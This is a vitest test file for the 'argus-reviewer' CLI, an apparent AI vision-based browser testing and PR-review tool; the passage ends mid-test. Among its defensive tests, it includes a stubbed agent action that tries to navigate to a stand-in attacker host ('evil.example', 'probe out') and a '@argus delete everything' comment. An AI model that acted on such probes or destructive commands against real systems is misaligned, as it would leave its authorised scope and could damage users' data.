import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { mkdtemp, mkdir, readFile, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'

import { main } from '../../src/cli.js'
import { TargetProcess } from '../../src/driver/target.js'
import { VisionClient } from '../../src/engine/loop.js'
import { CallCost, CallKind } from '../../src/vision/cost.js'
import { JsonSchema, Message } from '../../src/vision/openrouter.js'
import { ProviderRules } from '../../src/config.js'

const SERVE_SCRIPT = fileURLToPath(new URL('../fixtures/serve.mjs', import.meta.url))
const FIXTURE_DIR = fileURLToPath(new URL('../fixtures/', import.meta.url))

let FIXTURE_URL = ''
let fixtureServer: TargetProcess | undefined

beforeAll(async () => {
  const port = 5400 + Math.floor(Math.random() * 400)
  fixtureServer = await TargetProcess.start({
    command: `${JSON.stringify(process.execPath)} ${JSON.stringify(SERVE_SCRIPT)} ${port} ${JSON.stringify(FIXTURE_DIR)}`,
    url: `http://127.0.0.1:${port}/`,
    readyTimeoutMs: 10_000,
  })
  FIXTURE_URL = fixtureServer.url
})

afterAll(async () => {
  await fixtureServer?.stop()
})

class StubClient implements VisionClient {
  calls: { kind: CallKind; model: string }[] = []
  private queue: { content: string }[]

  constructor(queue: { content: string }[]) {
    this.queue = [...queue]
  }

  async complete(opts: {
    model: string
    messages: Message[]
    schema?: JsonSchema
    escalationModels?: string[]
    provider?: ProviderRules
    kind?: CallKind
  }): Promise<{ id: string; content: string; cost: CallCost; model: string }> {
    const next = this.queue.shift()
    if (!next) throw new Error('stub client queue empty')
    this.calls.push({ kind: opts.kind ?? 'ground', model: opts.model })
    const cost: CallCost = {
      model: opts.model,
      provider: 'stub',
      tokens: 10,
      costUsd: 0.001,
      kind: opts.kind ?? 'ground',
    }
    return { id: `stub-${this.calls.length}`, content: next.content, model: opts.model, cost }
  }
}

interface Captured {
  lines: string[]
  fn: (line: string) => void
}

function capture(): Captured {
  const lines: string[] = []
  return { lines, fn: (line) => lines.push(line) }
}

describe('argus-reviewer CLI', () => {
  it('record --help and run --help exit 0', async () => {
    const out = capture()
    expect(await main(['record', '--help'], { out: out.fn })).toBe(0)
    expect(await main(['run', '--help'], { out: out.fn })).toBe(0)
    expect(await main(['--help'], { out: out.fn })).toBe(0)
    expect(out.lines.join('\n')).toContain('argus-reviewer run')
    expect(out.lines.join('\n')).toContain('argus-reviewer record')
  })

  it('record rejects a non-positive-integer --max-steps before launching', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-maxsteps-'))
    const out = capture()
    const err = capture()
    for (const bad of ['0', '-3', '1.5', 'abc']) {
      const code = await main(
        ['record', 'click the thing', '--url', FIXTURE_URL, `--max-steps=${bad}`],
        { cwd, out: out.fn, err: err.fn },
      )
      expect(code).toBe(2)
    }
    expect(err.lines.join('\n')).toContain('--max-steps must be a positive integer')
  })

  it('runs a td-API test file end-to-end, warns on unknown provider slugs, writes JUnit + report', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cli-'))
    const testsDir = join(cwd, 'tests')
    const cacheDir = join(cwd, 'cache')
    const reportDir = join(cwd, 'report')
    await mkdir(testsDir, { recursive: true })

    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        testsDir,
        cacheDir,
        reportDir,
        budgetUsd: 1,
        provider: { ignore: ['siliconflow', 'nonexistent-provider'] },
      }),
    )

    // Plain-TS test using the td DSL — globals `test`/`td` injected by `run`.
    await writeFile(
      join(testsDir, 'landing.test.ts'),
      `test('fixture click flow', async (td) => {
  await td.find('the "Click me" button').click()
  const ok = await td.assert('the marker shows clicked')
  if (ok.verdict !== 'pass') throw new Error(ok.reasoning)
})
`,
    )

    const client = new StubClient([
      { content: JSON.stringify({ action: 'click', x: 200, y: 130, reasoning: 'the button' }) },
      { content: JSON.stringify({ verdict: 'pass', reasoning: 'marker reads clicked' }) },
    ])

    const out = capture()
    const err = capture()
    const code = await main(['run', '--url', FIXTURE_URL], {
      cwd,
      out: out.fn,
      err: err.fn,
      createClient: () => client,
      env: { ...process.env, OPENROUTER_API_KEY: 'test-key' },
    })

    expect(code).toBe(0)
    expect(err.lines.join('\n')).toContain('unknown provider slug "nonexistent-provider"')
    expect(out.lines.join('\n')).toContain('PASS fixture click flow')
    expect(client.calls.length).toBe(2)

    const junit = await readFile(join(reportDir, 'junit.xml'), 'utf8')
    expect(junit).toContain('name="fixture click flow"')
    expect(junit).toMatch(/time="\d+\.\d{3}"/)
    expect(junit).not.toContain('<failure')

    const report = JSON.parse(await readFile(join(reportDir, 'run.json'), 'utf8')) as {
      ok: boolean
      totals: {
        passed: number
        failed: number
        visionCalls: number
        visionCostUsd: number
        cacheHits: number
        cacheMisses: number
      }
      tests: { name: string; ok: boolean; asserts: { verdict: string }[] }[]
    }
    expect(report.ok).toBe(true)
    expect(report.totals.passed).toBe(1)
    expect(report.totals.failed).toBe(0)
    expect(report.totals.visionCalls).toBe(2)
    expect(report.totals.visionCostUsd).toBeCloseTo(0.002)
    expect(report.totals.cacheHits).toBe(0)
    expect(report.totals.cacheMisses).toBe(1)
    expect(report.tests[0]!.asserts[0]!.verdict).toBe('pass')

    // The locate call wrote a fingerprint cache entry for the test flow.
    const cache = JSON.parse(
      await readFile(join(cacheDir, 'landing__fixture-click-flow.json'), 'utf8'),
    ) as { steps: { instruction: string; action: { action: string } }[] }
    expect(cache.steps.length).toBe(1)
    expect(cache.steps[0]!.action.action).toBe('click')
  }, 60_000)

  it('marks the run failed when an assertion fails', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cli-fail-'))
    const testsDir = join(cwd, 'tests')
    await mkdir(testsDir, { recursive: true })
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({ testsDir, reportDir: join(cwd, 'report'), budgetUsd: 1 }),
    )
    await writeFile(
      join(testsDir, 'failing.test.mjs'),
      `test('failing assert', async (td) => {
  await td.assert('an element that does not exist is visible')
})
`,
    )
    const client = new StubClient([
      { content: JSON.stringify({ verdict: 'fail', reasoning: 'no such element on screen' }) },
    ])
    const code = await main(['run', '--url', FIXTURE_URL], {
      cwd,
      out: capture().fn,
      err: capture().fn,
      createClient: () => client,
    })
    expect(code).toBe(1)
    const junit = await readFile(join(cwd, 'report', 'junit.xml'), 'utf8')
    expect(junit).toContain('<failure')
    expect(junit).toContain('failing assert')
  }, 60_000)

  it('run reports a failure rather than a pass when no test files exist', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cli-empty-'))
    const testsDir = join(cwd, 'tests')
    const reportDir = join(cwd, 'report')
    await mkdir(testsDir, { recursive: true })
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({ testsDir, reportDir, budgetUsd: 1 }),
    )
    const err = capture()
    const code = await main(['run', '--url', FIXTURE_URL], {
      cwd,
      out: capture().fn,
      err: err.fn,
      createClient: () => new StubClient([]),
    })
    expect(code).toBe(1)
    expect(err.lines.join('\n')).toContain('no test files found')
    const report = JSON.parse(await readFile(join(reportDir, 'run.json'), 'utf8')) as {
      ok: boolean
      totals: { tests: number }
    }
    expect(report.ok).toBe(false)
    expect(report.totals.tests).toBe(0)
  }, 60_000)

  it('fails closed when a test file registers nothing and records no evidence', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cli-empty-file-'))
    const testsDir = join(cwd, 'tests')
    const reportDir = join(cwd, 'report')
    await mkdir(testsDir, { recursive: true })
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({ testsDir, reportDir, budgetUsd: 1 }),
    )
    // Imports cleanly, but registers no test() and calls no td.* — the file
    // produces zero evidence and must not read as a pass.
    await writeFile(join(testsDir, 'empty.test.mjs'), `// intentionally empty\n`)
    const out = capture()
    const err = capture()
    const code = await main(['run', '--url', FIXTURE_URL], {
      cwd,
      out: out.fn,
      err: err.fn,
      createClient: () => new StubClient([]),
    })
    expect(code).toBe(1)
    expect(out.lines.join('\n')).toContain('FAIL empty')
    const report = JSON.parse(await readFile(join(reportDir, 'run.json'), 'utf8')) as {
      ok: boolean
      tests: { name: string; ok: boolean; failureMessage?: string }[]
    }
    expect(report.ok).toBe(false)
    expect(report.tests[0]?.ok).toBe(false)
    expect(report.tests[0]?.failureMessage).toContain('no evidence')
  }, 60_000)

  it('invokes config pageSetup with the page before navigation', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-setup-'))
    const testsDir = join(cwd, 'tests')
    await mkdir(testsDir, { recursive: true })

    // pageSetup receives the Playwright page; assert it fires pre-navigation
    // (url is still about:blank) and records a marker we can observe.
    await writeFile(
      join(cwd, 'setup.mjs'),
      `export default async function setup(page) {
  if (page.url() !== 'about:blank') throw new Error('pageSetup ran after navigation')
  globalThis.__pageSetupCalls = (globalThis.__pageSetupCalls || 0) + 1
  await page.addInitScript('globalThis.__seeded = true')
}
`,
    )
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        testsDir,
        reportDir: join(cwd, 'report'),
        pageSetup: './setup.mjs',
        budgetUsd: 1,
      }),
    )
    await writeFile(
      join(testsDir, 'noop.test.mjs'),
      `test('noop', async () => {})
`,
    )
    const client = new StubClient([])
    const code = await main(['run', '--url', FIXTURE_URL], {
      cwd,
      out: capture().fn,
      err: capture().fn,
      createClient: () => client,
    })
    expect(code).toBe(0)
    expect((globalThis as Record<string, unknown>).__pageSetupCalls).toBe(1)
  }, 60_000)

  it('explore act pass runs with zero test files and lands on report.explore', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-explore-'))
    const testsDir = join(cwd, 'tests')
    await mkdir(testsDir, { recursive: true })
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        testsDir,
        reportDir: join(cwd, 'report'),
        cacheDir: join(cwd, 'cache'),
        explore: { enabled: true, maxSteps: 5 },
        budgetUsd: 1,
      }),
    )
    // Seeded-anomaly fixture: console errors + a pageerror on load.
    const exploreUrl = `file://${fileURLToPath(new URL('../fixtures/explore.html', import.meta.url))}`
    const client = new StubClient([
      // file:// targets refuse every navigate (no http origin) — the
      // refusal is journaled and counts as a step. Keep the script short:
      // the static fixture's page signature stalls the loop at 3 repeats.
      { content: JSON.stringify({ action: 'navigate', url: 'https://evil.example', reasoning: 'probe out' }) },
      { content: JSON.stringify({ action: 'done', reasoning: 'surface covered' }) },
    ])
    const code = await main(['run', '--url', exploreUrl], {
      cwd,
      out: capture().fn,
      err: capture().fn,
      createClient: () => client,
    })
    expect(code).toBe(0)
    const report = JSON.parse(await readFile(join(cwd, 'report', 'run.json'), 'utf8')) as {
      ok: boolean
      totals: { visionCalls: number; visionCostUsd: number }
      explore?: {
        enabled: boolean
        skipped?: string
        steps?: number
        visited?: number
        stopReason?: string
        visionCalls?: number
        captures?: { kind: string; text: string; count: number }[]
      }
    }
    expect(report.ok).toBe(true)
    expect(report.explore?.enabled).toBe(true)
    expect(report.explore?.skipped).toBeUndefined()
    expect(report.explore?.steps).toBe(2)
    expect(report.explore?.stopReason).toBe('done')
    expect(report.explore?.visionCalls).toBe(2)
    // Explore calls are billed into run totals even though no test owns them.
    expect(report.totals.visionCalls).toBe(2)
    expect(report.totals.visionCostUsd).toBeCloseTo(0.002)
    expect(client.calls.every((c) => c.kind === 'explore')).toBe(true)
    // The explore session's taps captured the seeded anomalies.
    const kinds = (report.explore?.captures ?? []).map((c) => c.kind)
    expect(kinds).toContain('console-error')
    expect(kinds).toContain('pageerror')
  }, 60_000)

  it('explore errored pass renders as skipped while keeping captured evidence', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-explore-err-'))
    const testsDir = join(cwd, 'tests')
    await mkdir(testsDir, { recursive: true })
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        testsDir,
        reportDir: join(cwd, 'report'),
        cacheDir: join(cwd, 'cache'),
        explore: { enabled: true, maxSteps: 5 },
        budgetUsd: 1,
      }),
    )
    const exploreUrl = `file://${fileURLToPath(new URL('../fixtures/explore.html', import.meta.url))}`
    // Empty queue — the first explore model call throws inside the loop.
    const client = new StubClient([])
    const code = await main(['run', '--url', exploreUrl], {
      cwd,
      out: capture().fn,
      err: capture().fn,
      createClient: () => client,
    })
    // An errored pass is recorded and its captures kept, but with zero test
    // evidence the run fails closed — an explore that errored is not a pass.
    expect(code).toBe(1)
    const report = JSON.parse(await readFile(join(cwd, 'report', 'run.json'), 'utf8')) as {
      ok: boolean
      explore?: {
        skipped?: string
        steps?: number
        captures?: { kind: string }[]
      }
    }
    expect(report.ok).toBe(false)
    // 'stopped: error' reports as an explicit skip, not a bare pass summary.
    expect(report.explore?.skipped).toContain('model call threw')
    expect(report.explore?.steps).toBeUndefined()
    // The page loaded before the error — its seeded anomalies survive.
    expect((report.explore?.captures ?? []).some((c) => c.kind === 'pageerror')).toBe(true)
  }, 60_000)

  it('explore budget exhaustion flags run totals', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-explore-budget-'))
    const testsDir = join(cwd, 'tests')
    await mkdir(testsDir, { recursive: true })
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        testsDir,
        reportDir: join(cwd, 'report'),
        cacheDir: join(cwd, 'cache'),
        // Lane cap below one $0.001 call's next projection — the second
        // canSpend check trips the ledger's budgetExceeded flag.
        explore: { enabled: true, maxSteps: 5, budgetUsd: 0.001 },
        budgetUsd: 10,
      }),
    )
    const exploreUrl = `file://${fileURLToPath(new URL('../fixtures/explore.html', import.meta.url))}`
    const client = new StubClient([
      { content: JSON.stringify({ action: 'wait', ms: 1 }) },
      { content: JSON.stringify({ action: 'wait', ms: 1 }) },
    ])
    const code = await main(['run', '--url', exploreUrl], {
      cwd,
      out: capture().fn,
      err: capture().fn,
      createClient: () => client,
    })
    expect(code).toBe(0)
    const report = JSON.parse(await readFile(join(cwd, 'report', 'run.json'), 'utf8')) as {
      totals: { budgetExceeded: boolean }
      explore?: { stopReason?: string }
    }
    expect(report.explore?.stopReason).toBe('budget')
    expect(report.totals.budgetExceeded).toBe(true)
  }, 60_000)

  it('explore degrades to an explicit skip when the target is unreachable', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-explore-skip-'))
    const testsDir = join(cwd, 'tests')
    await mkdir(testsDir, { recursive: true })
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        testsDir,
        reportDir: join(cwd, 'report'),
        cacheDir: join(cwd, 'cache'),
        explore: { enabled: true },
      }),
    )
    // Port 1 is closed — no config.target.command, so nothing waits on it;
    // the explore session's own goto fails.
    const client = new StubClient([])
    const code = await main(['run', '--url', 'http://127.0.0.1:1/'], {
      cwd,
      out: capture().fn,
      err: capture().fn,
      createClient: () => client,
    })
    // The skip is recorded explicitly, but zero observed evidence means the
    // run fails closed — enabled is configuration, not a pass (R11 still
    // holds when real tests carry the evidence).
    expect(code).toBe(1)
    const report = JSON.parse(await readFile(join(cwd, 'report', 'run.json'), 'utf8')) as {
      ok: boolean
      explore?: { enabled: boolean; skipped?: string }
    }
    expect(report.ok).toBe(false)
    expect(report.explore?.skipped).toContain('no reachable target')
  }, 60_000)

  it('cache list and prune operate on the cache dir', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-cache-'))
    const cacheDir = join(cwd, 'cache')
    await mkdir(cacheDir, { recursive: true })
    await writeFile(join(cacheDir, 'flow-a.json'), JSON.stringify({ steps: [] }))
    await writeFile(join(cwd, 'argus-reviewer.config.json'), JSON.stringify({ cacheDir }))
    const out = capture()
    expect(await main(['cache', 'list'], { cwd, out: out.fn })).toBe(0)
    expect(out.lines.join('\n')).toContain('flow-a: 0 steps')
    expect(await main(['cache', 'prune', 'flow-a'], { cwd, out: out.fn })).toBe(0)
    expect(await main(['cache', 'list'], { cwd, out: out.fn })).toBe(0)
    expect(out.lines.join('\n')).toContain('cache empty')
  })

  it('delegate forwards the task to a0 headless with the resolved host', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-delegate-'))
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({ a0: { url: 'https://a0.example.com' } }),
    )
    const seen: { args?: string[] } = {}
    const code = await main(['delegate', 'click through the signup flow', '--url', 'http://app.local'], {
      cwd,
      out: capture().fn,
      err: capture().fn,
      exec: async (_cmd, args) => {
        seen.args = args
        return { code: 0, stdout: 'signup flow works\n', stderr: '' }
      },
    })
    expect(code).toBe(0)
    expect(seen.args?.[0]).toBe('headless')
    expect(seen.args).toContain('https://a0.example.com')
    const prompt = seen.args?.at(-1) ?? ''
    expect(prompt).toContain('click through the signup flow')
    expect(prompt).toContain('http://app.local')
  })

  it('delegate exits 2 without a task and non-zero when a0 fails', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-delegate-'))
    const exec = async () => ({ code: 1, stdout: '', stderr: 'connection refused' })
    expect(await main(['delegate'], { cwd, out: capture().fn, err: capture().fn, exec })).toBe(2)
    expect(await main(['delegate', 'task'], { cwd, out: capture().fn, err: capture().fn, exec })).toBe(1)
  })

  it('delegate refuses an env-resolved remote host with a loopback target (#53)', async () => {
    // AGENT_ZERO_HOST reaches the child env even without --host/a0.url —
    // the refusal must resolve the effective host, not just the flag.
    const cwd = await mkdtemp(join(tmpdir(), 'argus-delegate-remote-'))
    let spawned = false
    const err = capture()
    const code = await main(['delegate', 'check the page', '--url', 'http://localhost:3000'], {
      cwd,
      out: capture().fn,
      err: err.fn,
      env: { ...process.env, AGENT_ZERO_HOST: 'https://a0.remote.test' },
      exec: async () => {
        spawned = true
        return { code: 0, stdout: '', stderr: '' }
      },
      probe: async () => false,
    })
    expect(code).toBe(1)
    expect(spawned).toBe(false)
    expect(err.lines.join('\n')).toContain('is remote but the target')
  })

  it('run with heal:a0 delegates each failed test to Agent Zero', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-heal-'))
    const testsDir = join(cwd, 'tests')
    await mkdir(testsDir, { recursive: true })
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        testsDir,
        reportDir: join(cwd, 'report'),
        budgetUsd: 1,
        heal: 'a0',
        // Loopback host matches the loopback fixture target — a remote host
        // would be refused before any delegation.
        a0: { url: 'http://localhost:5080' },
      }),
    )
    await writeFile(
      join(testsDir, 'failing.test.mjs'),
      `test('failing assert', async (td) => {
  await td.assert('an element that does not exist is visible')
})
`,
    )
    const client = new StubClient([
      { content: JSON.stringify({ verdict: 'fail', reasoning: 'no such element on screen' }) },
    ])
    const delegated: string[] = []
    const out = capture()
    const code = await main(['run', '--url', FIXTURE_URL], {
      cwd,
      out: out.fn,
      err: capture().fn,
      createClient: () => client,
      exec: async (_cmd, args) => {
        if (args[0] === 'headless') {
          delegated.push(args.at(-1) ?? '')
          return { code: 0, stdout: 'the app is broken: no marker rendered', stderr: '' }
        }
        return { code: 1, stdout: '', stderr: 'unauthenticated' } // gh auth status
      },
    })
    expect(code).toBe(1)
    expect(delegated.length).toBe(1)
    expect(delegated[0]).toContain('failing assert')
    expect(delegated[0]).toContain(FIXTURE_URL)
    expect(out.lines.join('\n')).toContain('a0 diagnosis')
    const report = JSON.parse(
      await readFile(join(cwd, 'report', 'run.json'), 'utf8'),
    ) as { tests: { a0Diagnosis?: string }[] }
    expect(report.tests[0]!.a0Diagnosis).toBe('the app is broken: no marker rendered')
  }, 60_000)

  it('heal:a0 stops at the delegation cap — a0.maxTasks (#53)', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-heal-cap-'))
    const testsDir = join(cwd, 'tests')
    await mkdir(testsDir, { recursive: true })
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        testsDir,
        reportDir: join(cwd, 'report'),
        budgetUsd: 1,
        heal: 'a0',
        a0: { url: 'http://localhost:5080', maxTasks: 2 },
      }),
    )
    for (const name of ['fail-a', 'fail-b', 'fail-c']) {
      await writeFile(
        join(testsDir, `${name}.test.mjs`),
        `test('${name}', async (td) => {\n  await td.assert('an element that does not exist is visible')\n})\n`,
      )
    }
    const client = new StubClient([
      { content: JSON.stringify({ verdict: 'fail', reasoning: 'missing' }) },
      { content: JSON.stringify({ verdict: 'fail', reasoning: 'missing' }) },
      { content: JSON.stringify({ verdict: 'fail', reasoning: 'missing' }) },
    ])
    const delegated: string[] = []
    const err = capture()
    const code = await main(['run', '--url', FIXTURE_URL], {
      cwd,
      out: capture().fn,
      err: err.fn,
      createClient: () => client,
      exec: async (_cmd, args) => {
        if (args[0] === 'headless') {
          delegated.push(args.at(-1) ?? '')
          return { code: 0, stdout: 'diagnosis', stderr: '' }
        }
        return { code: 1, stdout: '', stderr: 'unauthenticated' }
      },
    })
    expect(code).toBe(1)
    // Three failures, cap 2 — the third test gets no delegation.
    expect(delegated.length).toBe(2)
    expect(err.lines.join('\n')).toContain('delegation cap reached (2)')
  }, 60_000)

  it('heal:a0 refuses when the host is remote but the target is loopback (#53)', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-heal-remote-'))
    const testsDir = join(cwd, 'tests')
    await mkdir(testsDir, { recursive: true })
    await writeFile(
      join(cwd, 'argus-reviewer.config.json'),
      JSON.stringify({
        testsDir,
        reportDir: join(cwd, 'report'),
        budgetUsd: 1,
        heal: 'a0',
        a0: { url: 'https://a0.example.com' },
      }),
    )
    await writeFile(
      join(testsDir, 'failing.test.mjs'),
      `test('failing', async (td) => {\n  await td.assert('an element that does not exist is visible')\n})\n`,
    )
    const client = new StubClient([
      { content: JSON.stringify({ verdict: 'fail', reasoning: 'missing' }) },
    ])
    let delegations = 0
    const err = capture()
    const code = await main(['run', '--url', FIXTURE_URL], {
      cwd,
      out: capture().fn,
      err: err.fn,
      createClient: () => client,
      exec: async (_cmd, args) => {
        if (args[0] === 'headless') delegations++
        return { code: 1, stdout: '', stderr: 'unauthenticated' }
      },
    })
    expect(code).toBe(1)
    expect(delegations).toBe(0)
    expect(err.lines.join('\n')).toContain('is remote but the target')
  }, 60_000)

  it('init suggests (never enables) A0 when a host resolves — R19', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-init-'))
    const out = capture()
    const code = await main(['init'], {
      cwd,
      out: out.fn,
      err: capture().fn,
      env: { ...process.env, AGENT_ZERO_HOST: 'https://a0.example.com' },
      exec: async (cmd) =>
        cmd === 'a0'
          ? { code: 0, stdout: '2.12\n', stderr: '' }
          : { code: 1, stdout: '', stderr: 'unauthenticated' },
    })
    expect(code).toBe(0)
    const text = out.lines.join('\n')
    expect(text).toContain('argus-reviewer environment')
    expect(text).toContain('a0 2.12 → https://a0.example.com')
    expect(text).toContain('opt-in')
    const config = await readFile(join(cwd, 'argus-reviewer.config.ts'), 'utf8')
    expect(config).toContain('https://a0.example.com')
    // Labeled suggestion lives in comments — no enabled a0/heal lane lines.
    expect(config).not.toMatch(/^\s+a0:/m)
    expect(config).not.toMatch(/^\s+heal:/m)
  })

  it('init names provider data flow, budget posture, and the stop path — R19', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-init-'))
    const out = capture()
    const code = await main(['init'], {
      cwd,
      out: out.fn,
      err: capture().fn,
      // No key — the named setup failure must be visible, not a silent pass.
      env: { ...process.env, OPENROUTER_API_KEY: '' },
      exec: async () => ({ code: 1, stdout: '', stderr: 'unauthenticated' }),
    })
    expect(code).toBe(0)
    const text = out.lines.join('\n')
    expect(text).toContain('✗ export OPENROUTER_API_KEY')
    expect(text).toContain('sent to provider')
    expect(text).toContain('default budget')
    expect(text).toContain('how to stop')
    expect(text).toContain('verify')
  })

  it('the generated workflow is code-review-only with the permissions it needs', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-init-'))
    await main(['init'], { cwd, out: capture().fn, err: capture().fn })
    const workflow = await readFile(join(cwd, '.github/workflows/argus-reviewer.yml'), 'utf8')
    // Review-only: the action's `run` input stays at its 'false' default —
    // no executable lanes are enabled by the scaffold.
    expect(workflow).not.toMatch(/run:\s*['"]?true/)
    expect(workflow).toContain('contents: read')
    expect(workflow).toContain('issues: write')
    expect(workflow).toContain('pull-requests: write')
    expect(workflow).not.toContain('contents: write')
  })

  it('init scaffolds config, smoke test, and workflow; skips existing files', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'argus-init-'))
    const out = capture()
    expect(await main(['init'], { cwd, out: out.fn })).toBe(0)
    const { existsSync } = await import('node:fs')
    expect(existsSync(join(cwd, 'argus-reviewer.config.ts'))).toBe(true)
    expect(existsSync(join(cwd, 'tests/argus/smoke.test.ts'))).toBe(true)
    expect(existsSync(join(cwd, '.github/workflows/argus-reviewer.yml'))).toBe(true)
    const workflow = await readFile(join(cwd, '.github/workflows/argus-reviewer.yml'), 'utf8')
    expect(workflow).toContain('ref: ${{ github.event.pull_request.head.sha || github.sha }}')
    expect(workflow).toMatch(/actions\/checkout@[0-9a-f]{40} # v7/)
    expect(workflow).toMatch(
      /duketopceo\/Argus\/action@[0-9a-f]{40} # v0\.2\.0/,
    )
    // Second run without --force skips rather than overwriting
    const out2 = capture()
    expect(await main(['init'], { cwd, out: out2.fn })).toBe(0)
    expect(out2.lines.join('\n')).toContain('exists, skipping')
  })
})

describe('argus-reviewer mention', () => {
  const mentionEvent = async (
    body: string,
    opts: { association?: string; onPr?: boolean } = {},
  ): Promise<{ env: Record<string, string>; dir: string }> => {
    const dir = await mkdtemp(join(tmpdir(), 'argus-mention-'))
    const eventPath = join(dir, 'event.json')
    await writeFile(
      eventPath,
      JSON.stringify({
        issue:
          opts.onPr === false ? { number: 7 } : { number: 7, pull_request: {} },
        comment: { body, author_association: opts.association ?? 'MEMBER' },
      }),
    )
    return {
      dir,
      env: {
        GITHUB_EVENT_NAME: 'issue_comment',
        GITHUB_EVENT_PATH: eventPath,
      },
    }
  }

  it('ignores non-PR comments and non-mention bodies', async () => {
    const out = capture()
    const noPr = await mentionEvent('@argus review', { onPr: false })
    expect(await main(['mention'], { env: noPr.env, out: out.fn })).toBe(0)
    expect(out.lines.join('\n')).toContain('not on a pull request')

    const noMention = await mentionEvent('looks good to me')
    expect(await main(['mention'], { env: noMention.env, out: out.fn })).toBe(0)
    expect(out.lines.join('\n')).toContain('no @argus command')
  })

  it('ignores untrusted commenters without replying', async () => {
    const out = capture()
    const err = capture()
    const { env } = await mentionEvent('@argus review', { association: 'FIRST_TIMER' })
    expect(await main(['mention'], { env, out: out.fn, err: err.fn })).toBe(0)
    expect(err.lines.join('\n')).toContain('not trusted')
    // No fetch happened — no token/repo env, and the gate fired before meta.
  })

  it('errors when run outside an issue_comment event', async () => {
    const err = capture()
    expect(
      await main(['mention'], {
        env: { GITHUB_EVENT_NAME: 'pull_request', GITHUB_EVENT_PATH: '/nope' },
        err: err.fn,
      }),
    ).toBe(2)
    expect(err.lines.join('\n')).toContain('issue_comment')
  })

  it('replies help for unknown commands when the commenter is trusted', async () => {
    const posts: string[] = []
    const fetchStub = async (input: RequestInfo | URL, init?: RequestInit) => {
      posts.push(String(init?.body))
      return new Response('{}', { status: 201 })
    }
    const original = globalThis.fetch
    globalThis.fetch = fetchStub as typeof fetch
    try {
      const { env } = await mentionEvent('@argus delete everything')
      const code = await main(['mention'], {
        env: { ...env, GITHUB_REPOSITORY: 'a/b', GITHUB_TOKEN: 'tok' },
        out: capture().fn,
        err: capture().fn,
      })
      expect(code).toBe(0)
      expect(posts).toHaveLength(1)
      expect(posts[0]).toContain('@argus review')
    } finally {
      globalThis.fetch = original
    }
  })

  it('persist commits the embedded probe and replies with the new PR', async () => {
    const { encodeProbePayload } = await import('../../src/probe/persist.js')
    const marker = encodeProbePayload(
      [
        {
          file: 'x.test.ts',
          findingFile: 'src/x.ts',
          findingLine: 1,
          outcome: 'reproduced',
          durationMs: 1,
          costUsd: 0,
          tokens: 0,
          detail: 'reproduced',
          path: 'tests/argus-probe-x.test.ts',
          content: 'test("x",()=>{})',
        },
      ],
      'h1',
    )
    const replies: string[] = []
    const fetchStub = async (input: RequestInfo | URL, init?: RequestInit) => {
      const url = String(input)
      const method = init?.method ?? 'GET'
      if (method === 'POST' && url.endsWith('/issues/7/comments')) {
        replies.push(String(init?.body))
        return new Response('{}', { status: 201 })
      }
      if (url.endsWith('/pulls/7')) {
        return new Response(
          JSON.stringify({
            head: { sha: 'h1', repo: { fork: false } },
            base: { sha: 'b1', ref: 'main' },
            author_association: 'MEMBER',
            labels: [],
          }),
          { status: 200 },
        )
      }
      if (url.includes('/compare/')) {
        return new Response(JSON.stringify({ merge_base_commit: { sha: 'b1' } }), { status: 200 })
      }
      if (url.includes('/issues/7/comments')) {
        return new Response(
          JSON.stringify([{ body: `<!-- argus-reviewer -->\nsticky\n${marker}` }]),
          { status: 200 },
        )
      }
      if (url.endsWith('/git/ref/heads/main')) {
        return new Response(JSON.stringify({ object: { sha: 'b1' } }), { status: 200 })
      }
      if (method === 'POST' && url.endsWith('/git/refs')) {
        return new Response('{}', { status: 201 })
      }
      if (method === 'PUT') return new Response('{}', { status: 201 })
      if (method === 'GET' && url.includes('/pulls?head=')) {
        return new Response('[]', { status: 200 })
      }
      if (method === 'POST' && url.endsWith('/pulls')) {
        return new Response(JSON.stringify({ html_url: 'https://github.com/a/b/pull/42' }), {
          status: 201,
        })
      }
      return new Response('{}', { status: 404 })
    }
    const original = globalThis.fetch
    globalThis.fetch = fetchStub as typeof fetch
    try {
      const { env } = await mentionEvent('@argus persist')
      const code = await main(['mention'], {
        env: { ...env, GITHUB_REPOSITORY: 'a/b', GITHUB_TOKEN: 'tok' },
        out: capture().fn,
        err: capture().fn,
      })
      expect(code).toBe(0)
      expect(replies).toHaveLength(1)
      expect(replies[0]).toContain('https://github.com/a/b/pull/42')
    } finally {
      globalThis.fetch = original
